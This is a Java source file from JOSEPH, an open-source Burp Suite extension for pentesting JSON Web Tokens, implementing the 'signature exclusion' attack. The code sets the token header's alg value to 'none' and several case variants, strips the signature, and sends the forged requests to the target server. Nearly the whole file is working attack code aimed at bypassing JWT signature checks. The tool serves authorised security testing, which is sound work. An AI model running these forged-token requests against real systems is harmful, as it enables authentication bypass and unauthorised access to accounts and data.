/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks;


import burp.*;
import eu.dety.burp.joseph.exceptions.AttackNotPreparedException;
import eu.dety.burp.joseph.exceptions.AttackPreparationFailedException;
import eu.dety.burp.joseph.utilities.Decoder;
import eu.dety.burp.joseph.utilities.Logger;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Signature Exclusion Attack
 *
 * Performs a signature exclusion attack by
 * changing the algorithm value of the header to
 * the "none" algorithm and cutting away the signature
 * value.
 *
 * @author Dennis Detering
 * @version 1.0
 */
public class SignatureExclusion implements IAttack, Runnable {
    private static final Logger loggerInstance = Logger.getInstance();
    private static final Decoder joseDecoder = new Decoder();
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IParameter parameter;

    // Unique identifier for the attack class
    private static final String id = "signature_exclusion";
    // Full name of the attack
    private static final String name = "Signature Exclusion";
    // List of types this attack is suitable for
    private static final List<String> suitableTypes = Arrays.asList("jwt", "jws");
    // Array of "none" algorithm type variations
    private static final String[] noneAlgVariations = {"none", "None", "NONE", "nOnE"};
    // Amount of requests needed
    private static final int amountRequests = noneAlgVariations.length;
    // Attack has been successfully prepared
    private boolean isPrepared = false;

    private List<byte[]> requests = new ArrayList<>();
    private List<IHttpRequestResponse> responses = new ArrayList<>();

    @Override
    public void prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        for (String noneAlgVariation : noneAlgVariations) {
            try {
                byte[] tmpRequest = requestResponse.getRequest();
                String[] tmpComponents = joseDecoder.getComponents(this.parameter.getValue());
                String tmpDecodedHeader = joseDecoder.getDecoded(tmpComponents[0]);
                String tmpReplaced = tmpDecodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariation + "\"");
                String tmpReplacedEncoded = joseDecoder.getEncoded(tmpReplaced);
                String[] tmpNewComponents = {tmpReplacedEncoded, tmpComponents[1], ""};
                String tmpParameterValue = joseDecoder.concatComponents(tmpNewComponents);

                IParameter tmpParameter = helpers.buildParameter(this.parameter.getName(), tmpParameterValue, this.parameter.getType());
                tmpRequest = helpers.updateParameter(tmpRequest, tmpParameter);
                requests.add(tmpRequest);
            } catch (Exception e) {
                throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
            }

        }

        this.isPrepared = true;
    }

    @Override
    public void performAttack() throws AttackNotPreparedException {
        if (!this.isPrepared) {
            throw new AttackNotPreparedException("Attack has not been prepared. Call prepareAttack() to prepare it.");
        }

        (new Thread(this)).start();
    }

    @Override
    public void run() {
        IHttpService httpService = this.requestResponse.getHttpService();

        for (byte[] request : this.requests) {
            this.responses.add(callbacks.makeHttpRequest(httpService, request));
        }
    }

    @Override
    public List<IHttpRequestResponse> getResult() {
        loggerInstance.log(getClass(), String.valueOf(responses.size()), Logger.DEBUG);
        return responses;
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public List<String> getSuitableTypes() {
        return suitableTypes;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean isSuitable(String type, String algorithm) {
        if(type != null && !type.equals("")) {
            return this.getSuitableTypes().contains(type.toLowerCase());
        }

        // TODO: Guessing / further checks if type is null
        return false;
    }

}
